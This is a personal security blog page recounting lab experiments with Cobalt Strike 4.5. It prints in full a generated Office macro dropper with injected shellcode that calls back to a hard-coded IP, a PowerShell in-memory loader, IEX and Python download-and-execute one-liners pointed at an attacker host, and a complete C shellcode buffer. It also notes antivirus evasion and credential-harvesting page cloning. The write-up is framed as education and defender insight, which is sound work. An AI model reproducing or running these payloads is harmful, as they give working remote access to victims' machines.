<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Playing With Cobalt Strike | Sid's Blog</title>
<meta name=keywords content="sid,lacy,blog,website,cybersecurity,security,computer,honeypot,malware,tech,network">
<meta name=description content="Fun with Cobalt Strike v4.5">
<meta name=author content="Sid Lacy">
<link rel=canonical href=https://swlacy.com/posts/playing-with-cobalt-strike/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.57f2b6dfb92097eb855e02e905de3644361ad2fc5089352e89b93d9a43712dd5.css integrity="sha256-V/K237kgl+uFXgLpBd42RDYa0vxQiTUuibk9mkNxLdU=" rel="preload stylesheet" as=style>
<link rel=preload href=apple-touch-icon.png as=image>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://swlacy.com/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://swlacy.com/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://swlacy.com/favicon-32x32.png>
<link rel=apple-touch-icon href=https://swlacy.com/apple-touch-icon.png>
<link rel=mask-icon href=https://swlacy.com/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.92.2">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-QFRYSRDLC1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-QFRYSRDLC1',{anonymize_ip:!1})}</script>
<meta property="og:title" content="Playing With Cobalt Strike">
<meta property="og:description" content="Fun with Cobalt Strike v4.5">
<meta property="og:type" content="article">
<meta property="og:url" content="https://swlacy.com/posts/playing-with-cobalt-strike/">
<meta property="og:image" content="https://swlacy.com/media/playing-with-cobalt-strike-cover.jpg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-02-11T00:00:00+00:00">
<meta property="article:modified_time" content="2022-02-11T00:00:00+00:00"><meta property="og:site_name" content="Sid's Blog">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://swlacy.com/media/playing-with-cobalt-strike-cover.jpg">
<meta name=twitter:title content="Playing With Cobalt Strike">
<meta name=twitter:description content="Fun with Cobalt Strike v4.5">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://swlacy.com/posts/"},{"@type":"ListItem","position":3,"name":"Playing With Cobalt Strike","item":"https://swlacy.com/posts/playing-with-cobalt-strike/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Playing With Cobalt Strike","name":"Playing With Cobalt Strike","description":"Fun with Cobalt Strike v4.5","keywords":["sid","lacy","blog","website","cybersecurity","security","computer","honeypot","malware","tech","network"],"articleBody":"Ah, Cobalt Strike, HelpSystems' infamous (but legitimate) Red Teaming product coopted by attackers worldwide for malicious purposes. For those unfamiliar, Cobalt Strike is an adversarial toolkit. Its official capacity in the security industry is to simulate attacks for testing purposes. Of course, as is perhaps expected, given the prompt release of each new version to the Internet, those with less noble intentions also make use of the software.\nBy certain means, I have obtained a copy of Cobalt Strike version 4.5, released on December 14th, 2021. As this is a recent, licensed version, I was curious about which type of malicious operations I could successfully perform and the code behind them. Of course, as with all content posted on my website, education is the only objective. I carried out all testing in a cloud lab environment, and I suggest you do the same should you follow my processes here. Enjoy!\nEnvironment I prefer to host my testing machines off-site, especially when dealing with unverified software, such as my copy of Cobalt Strike. To facilitate that, Google’s Cloud Compute Engine comes in handy. Unfortunately, due to licensing agreements with Microsoft, it is cheaper to run Windows hosts in Azure, so I have split my network like so:\nGoogle Cloud VPC └ Cobalt Strike (Debian 10) Azure VPC └ Victim Host (Windows 10) Microsoft Office Macro Generation Microsoft recently announced that they will disable MS Office macros embedded in files downloaded from the Internet by default — it’s about time. Office macro attacks are so common that Cobalt Strike even has a dedicated button to allow for their simple generation.\nOf course, I first have to set up a “listener,” something for my macro to contact. Luckily, HelpSystems provides their users (and abusers) with a set of well-detailed documentation. I decided to use windows/beacon_http/reverse_http as my payload, configured as shown below.\nUpon generation of the macro, Cobalt Strike displayed macro deployment instructions. Red teaming is fool-proof these days!\nHere is the source code of the macro:\nPrivate Type PROCESS_INFORMATION hProcess As Long hThread As Long dwProcessId As Long dwThreadId As Long End Type Private Type STARTUPINFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Long hStdInput As Long hStdOutput As Long hStdError As Long End Type #If VBA7 Then Private Declare PtrSafe Function CreateStuff Lib \"kernel32\" Alias \"CreateRemoteThread\" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr Private Declare PtrSafe Function AllocStuff Lib \"kernel32\" Alias \"VirtualAllocEx\" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr Private Declare PtrSafe Function WriteStuff Lib \"kernel32\" Alias \"WriteProcessMemory\" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr Private Declare PtrSafe Function RunStuff Lib \"kernel32\" Alias \"CreateProcessA\" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long #Else Private Declare Function CreateStuff Lib \"kernel32\" Alias \"CreateRemoteThread\" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long Private Declare Function AllocStuff Lib \"kernel32\" Alias \"VirtualAllocEx\" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long Private Declare Function WriteStuff Lib \"kernel32\" Alias \"WriteProcessMemory\" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long Private Declare Function RunStuff Lib \"kernel32\" Alias \"CreateProcessA\" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long #End If Sub Auto_Open() Dim myByte As Long, myArray As Variant, offset As Long Dim pInfo As PROCESS_INFORMATION Dim sInfo As STARTUPINFO Dim sNull As String Dim sProc As String #If VBA7 Then Dim rwxpage As LongPtr, res As LongPtr #Else Dim rwxpage As Long, res As Long #End If myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _ 13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _ -42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _ -117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _ -43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _ -58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _ 104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _ -43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _ -1,-1,47,110,56,115,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _ 83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,53,46,48,59,32,76,66, _ 66,82,79,87,83,69,82,41,13,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, _ 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _ 104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _ -123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,51,53,46,49,57,55,46,48,46,54,50,0,0,0,0,0) If Len(Environ(\"ProgramW6432\"))  0 Then sProc = Environ(\"windir\") \u0026 \"\\\\SysWOW64\\\\rundll32.exe\" Else sProc = Environ(\"windir\") \u0026 \"\\\\System32\\\\rundll32.exe\" End If res = RunStuff(sNull, sProc, ByVal 0\u0026, ByVal 0\u0026, ByVal 1\u0026, ByVal 4\u0026, ByVal 0\u0026, sNull, sInfo, pInfo) rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), \u0026H1000, \u0026H40) For offset = LBound(myArray) To UBound(myArray) myByte = myArray(offset) res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0\u0026) Next offset res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0) End Sub Sub AutoOpen() Auto_Open End Sub Sub Workbook_Open() Auto_Open End Sub VirusTotal Report\n15 of 59 antivirus programs capable of processing macro-loaded Excel files reported malicious activity from the script above, including Microsoft Defender. Thus, I will likely have to turn off Microsoft Defender to run the macro. Avast’s YARA Rule contributions specifically identified the maco as originating from Cobalt Strike.\nI found the absence of my IP address within the code particularly interesting. I assume it can be reconstructed from the obfuscated code by using the values in myArray since a plain address would be easy to find and flag as malicious. I have censored my IP in screenshots thus far — if you can reconstruct it from that array, please send me an email. I would love to know!\nExecution Here comes the fun part: let’s test the functionality of the macro. The software specifications of the Windows victim can be seen in the screenshot below. Sidenote: I find it disturbing that links to TikTok, mobile games, and Roblox are included in the Start Menu even in Azure images. What a nightmare.\nMicrosoft Defender immediately quarantined my Excel file upon saving it with the macro — annoying for my purposes, but a good thing nonetheless. However, many businesses do not remain vigilant when considering malware mitigation processes such as updating antivirus signatures, so the code generated by Cobalt Strike still poses a serious threat.\nDisabling Defender allowed me to proceed, and… Exploitation was successful! From here, a variety of options were available, including the ability to upload files, attempt privilege escalation, and more. Fascinating stuff. Unfortunately, not all features worked as expected, but I am not sure if this is due to a misconfiguration on my part or whether some of the exploits Cobalt Strike attempted have been patched by Microsoft.\nPowerShell Script Using the same listener, I generated the following PowerShell script in Cobalt Strike.\nSet-StrictMode -Version 2 function func_get_proc_address { Param ($var_module, $var_procedure) $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string')) return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure)) } function func_get_delegate_type { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters, [Parameter(Position = 1)] [Type] $var_return_type = [Void] ) $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed') $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed') return $var_type_builder.CreateType() } If ([IntPtr]::size -eq 8) { [Byte[]]$var_code = [System.Convert]::FromBase64String('') for ($x = 0; $x -lt $var_code.Count; $x++) { $var_code[$x] = $var_code[$x] -bxor 35 } $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))) $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40) [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length) $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void]))) $var_runme.Invoke([IntPtr]::Zero) } VirusTotal Report\nMany more antivirus engines (32/59) detected this script than the Excel macro. Examining the code, you may notice the [Byte[]]$var_code = [System.Convert]::FromBase64String('') line; while the code is relatively short, the Base64 string contained within it exceeds 350,000 characters, so I did not include the full output. Using alternative encoding is a classic malware obfuscation tactic, and I am not surprised to see it employed here.\nUsing, [System.Convert]::FromBase64String() I decoded the Base64 string, which revealed a massive set of numbers. It appears that these numbers are bitwise XORed with 35 (ASCII ‘#') to reconstruct the malicious commands. As shown by the VirusTotal report, this process was not complex enough to prevent widespread detection by updated AV engines.\nAs with the Excel macro, running this script on the victim host also established a tunnel back to Cobalt Strike.\nSpecial Delivery Certain situations may present themselves in which an attacker has difficulty planting a file into the victim’s environment; thus, HelpSystems has established alternative delivery methods. One such method is *Scripted Web-Delivery,\" an all-in-one setup that hosts a malicious file and provides one-liners in different languages to automate fetching and executing the file on the victim host.\nVictim one-liners, given a payload of windows/beacon_http/reverse_http:\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://X.X.X.X:80/a'))\" python -c \"import urllib2; exec urllib2.urlopen('http://X.X.X.X:80/a').read();\" Windows Defender identifies the PowerShell threat as TrojanDropper:PowerShell/Cobacis.B.\nMore Stuff C Payload Using the Payload Generator, Cobalt Strike will form a buffer array in several different languages. An example of this is shown below in C, though Java, Python, Perl, PowerShell, and more are supported as well.\nunsigned char buf[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\\x5d\\x6a\\x00\\x49\\xbe\\x77\\x69\\x6e\\x69\\x6e\\x65\\x74\\x00\\x41\\x56\\x49\\x89\\xe6\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x48\\x31\\xc9\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x41\\x50\\x41\\x50\\x41\\xba\\x3a\\x56\\x79\\xa7\\xff\\xd5\\xeb\\x73\\x5a\\x48\\x89\\xc1\\x41\\xb8\\x50\\x00\\x00\\x00\\x4d\\x31\\xc9\\x41\\x51\\x41\\x51\\x6a\\x03\\x41\\x51\\x41\\xba\\x57\\x89\\x9f\\xc6\\xff\\xd5\\xeb\\x59\\x5b\\x48\\x89\\xc1\\x48\\x31\\xd2\\x49\\x89\\xd8\\x4d\\x31\\xc9\\x52\\x68\\x00\\x02\\x40\\x84\\x52\\x52\\x41\\xba\\xeb\\x55\\x2e\\x3b\\xff\\xd5\\x48\\x89\\xc6\\x48\\x83\\xc3\\x50\\x6a\\x0a\\x5f\\x48\\x89\\xf1\\x48\\x89\\xda\\x49\\xc7\\xc0\\xff\\xff\\xff\\xff\\x4d\\x31\\xc9\\x52\\x52\\x41\\xba\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x0f\\x85\\x9d\\x01\\x00\\x00\\x48\\xff\\xcf\\x0f\\x84\\x8c\\x01\\x00\\x00\\xeb\\xd3\\xe9\\xe4\\x01\\x00\\x00\\xe8\\xa2\\xff\\xff\\xff\\x2f\\x43\\x41\\x63\\x76\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x73\\x65\\x72\\x2d\\x41\\x67\\x65\\x6e\\x74\\x3a\\x20\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x35\\x2e\\x30\\x20\\x28\\x63\\x6f\\x6d\\x70\\x61\\x74\\x69\\x62\\x6c\\x65\\x3b\\x20\\x4d\\x53\\x49\\x45\\x20\\x39\\x2e\\x30\\x3b\\x20\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x4e\\x54\\x20\\x36\\x2e\\x31\\x3b\\x20\\x54\\x72\\x69\\x64\\x65\\x6e\\x74\\x2f\\x35\\x2e\\x30\\x3b\\x20\\x42\\x4f\\x49\\x45\\x39\\x3b\\x45\\x53\\x45\\x53\\x29\\x0d\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x41\\xbe\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x31\\xc9\\xba\\x00\\x00\\x40\\x00\\x41\\xb8\\x00\\x10\\x00\\x00\\x41\\xb9\\x40\\x00\\x00\\x00\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x48\\x89\\xda\\x41\\xb8\\x00\\x20\\x00\\x00\\x49\\x89\\xf9\\x41\\xba\\x12\\x96\\x89\\xe2\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x74\\xb6\\x66\\x8b\\x07\\x48\\x01\\xc3\\x85\\xc0\\x75\\xd7\\x58\\x58\\x58\\x48\\x05\\x00\\x00\\x00\\x00\\x50\\xc3\\xe8\\x9f\\xfd\\xff\\xff\\x33\\x35\\x2e\\x31\\x39\\x37\\x2e\\x30\\x2e\\x36\\x32\\x00\\x00\\x00\\x00\\x00\"; Since it is just an array, it is undetectable by any of the AV engines on VirusTotal (though it is included in Avast’s YARA Ruleset). This has huge security implications — this shellcode can be embedded in other programs to great effect.\nI wrapped the buffer array in a small C function for compilation purposes and submitted the binary to VirusTotal, which then yielded four detections, a pitifully small amount nonetheless.\nForeign Connection? While I was toying with the Scripted Web-Delivery functionality, I noticed I received a new connection to my Cobalt Strike team server, however, from a computer I do not own! I ran a WHOIS lookup against the IP address; as it happened, the instance that connected to my Cobalt Strike session is part of Autonomous System Number 9808: Guangdong Province, China. is this some kind of reverse attack, I wonder? Perhaps Cobalt Strike has vulnerabilities of its own.\nI attempted to find any sort of information about the host by executing CS Beacon commands on it — after all, they had invited themselves onto my doorstep — but all attempts timed out. Very odd. If anyone has more information about why this happened, I would love to hear from you over email!\nReport Exporting As Cobalt Strike is intended to be a testing utility, it comes packaged with various features that would befit a penetration tester. One example of this is the report export tool, which generates report documents based on logged activity. Various reports can be generated, such as the IoCs and Hosts PDFs below.\nWebpage Cloning Cobalt Strike also supports webpage cloning, allowing not only for payload injection upon visiting a cloned website, but also credential and activity harvesting. Unfortunately, I was not able to get this to work properly with modern websites, try as I did with my university’s SSO portal.\nWrapping Up HelpSystems has provided no shortage of features with Cobalt Strike — that is indisputable. What I have shown here is only a small subset of Cobalt Strike’s functionality, and I intend to expand on more of the possibilities in the future.\nWhile I believe it is important to provide penetration testers with polished toolsets, these sorts of applications — Metasploit and Burp Suite included — present a very low barrier to entry for the aspiring cybercriminal. I am not suggesting they should be removed by any means, but it is an important topic to think about. Modern red teaming utilities have evolved to such a degree, abstracting technical concepts, that even beginners have a shot at breaching or infecting corporate systems. It’s an interesting debate, and ironic that criminals use the very tools we employ for protection as part of their attack frameworks.\nThank you so much for reading!\n I am open to comments and criticism — I learn alongside you. Please, do not hesitate to suggest an edit.\n Sid Lacy\nEmail • LinkedIn • GitHub\n","wordCount":"2078","inLanguage":"en","image":"https://swlacy.com/media/playing-with-cobalt-strike-cover.jpg","datePublished":"2022-02-11T00:00:00Z","dateModified":"2022-02-11T00:00:00Z","author":[{"@type":"Person","name":"Sid Lacy"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://swlacy.com/posts/playing-with-cobalt-strike/"},"publisher":{"@type":"Organization","name":"Sid's Blog","logo":{"@type":"ImageObject","url":"https://swlacy.com/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"&&document.body.classList.add('dark')</script>
<header class=header>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/styles/base16/espresso.min.css integrity="sha512-Alf9gBIx7O9Pn9+n7HJXcwZK6uXCaGDNj5ScAAtNsQ5OpUHBaXLEAaX00Z9N8S9o9lTG7FKgnRB5eXwUQKNu6g==" crossorigin=anonymous referrerpolicy=no-referrer>
<nav class=nav>
<div class=logo>
<a href=https://swlacy.com accesskey=h title=Home>
<img src=https://swlacy.com/apple-touch-icon.png alt=logo aria-label=logo height=" 21px">Sid's Blog</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="Toggle Dark Mode"><svg id="moon" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="moon" class="svg-inline--fa fa-moon" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg><svg id="sun" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="sun" class="svg-inline--fa fa-sun" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://swlacy.com/posts title=Search>
<span>Blog</span>
</a>
</li>
<li>
<a href=https://swlacy.com/documents title=Search>
<span>Docs</span>
</a>
</li>
<li>
<a href=https://swlacy.com/resume title=Search>
<span>Resume</span>
</a>
</li>
<li>
<a href=https://swlacy.com/about title=Search>
<span>About</span>
</a>
</li>
<li>
<a href=https://swlacy.com/archive title=Search>
<span>Archive</span>
</a>
